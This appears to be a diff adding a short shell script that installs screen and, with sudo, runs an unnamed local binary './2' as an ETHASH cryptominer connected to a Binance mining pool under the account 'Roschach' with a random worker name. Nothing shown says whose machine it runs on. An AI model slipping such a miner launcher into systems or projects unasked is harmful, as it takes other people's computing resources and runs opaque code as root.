@@ -1,0 +1,6 @@
+#!/bin/sh
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)#fjau-6xys
+sudo apt-get update
+sudo apt install screen -y
+sudo ./2 --algo ETHASH --pool stratum+tcp://ethw.poolbinance.com:443 --user Roschach.$WORKER --ethstratum ETHPROXY
